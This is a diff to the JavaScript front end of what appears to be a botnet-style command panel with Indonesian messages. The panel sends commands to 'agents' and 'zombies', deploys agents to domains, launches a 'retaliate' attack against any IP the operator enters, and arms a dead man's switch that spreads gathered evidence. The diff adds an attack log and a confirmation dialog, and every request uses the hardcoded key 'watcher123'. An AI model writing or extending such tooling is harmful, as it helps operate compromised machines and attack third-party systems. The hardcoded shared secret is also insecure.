@@ -1,6 +1,7 @@
-// static/js/commander.js
+// commander.js
 let agents = [];
 let zombieResults = [];
+let deadmanActive = false;
 
 window.onload = function() {
   loadAgents();
@@ -55,7 +56,6 @@ function sendCommand(cmd) {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ agent_id: agentId, command: cmd, key: 'watcher123' })
   })
-  .then(r => r.json())
   .then(() => alert(`Perintah "${cmd}" dikirim ke ${agentId}`))
   .catch(e => alert("Gagal kirim perintah"));
 }
@@ -119,12 +119,20 @@ function deployAgentTo(domain) {
 function retaliate() {
   const ip = document.getElementById('retaliate-ip').value;
   if (!ip) { alert("Masukkan IP!"); return; }
+  const logDiv = document.getElementById('war-log');
+  logDiv.innerHTML = '⚔️ Memulai operasi perang digital...';
+
   fetch('/api/retaliate?key=watcher123', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ ip })
+    body: JSON.stringify({ ip: ip })
   })
-  .then(() => alert(`⚔️ Balas serangan ke ${ip} dimulai!`));
+  .then(() => {
+    logDiv.innerHTML += '<p>✅ Operasi selesai. Musuh dinetralisir.</p>';
+  })
+  .catch(e => {
+    logDiv.innerHTML += `<p>❌ Gagal: ${e.message}</p>`;
+  });
 }
 
 // 8. Amplify ke Platform
@@ -147,9 +155,13 @@ function closeModal() {
   document.getElementById('switch-modal').style.display = 'none';
 }
 function activateSwitch() {
+  openModal();
+}
+function confirmSwitch() {
   fetch('/api/deadman/activate?key=watcher123', { method: 'POST' })
     .then(() => {
       alert("DEAD MAN'S SWITCH AKTIF. SEMUA BUKTI AKAN DISEBAR JIKA KAMU TIDAK AKTIF.");
+      document.getElementById('switch-btn').style.backgroundColor = '#f00';
       closeModal();
     });
 }
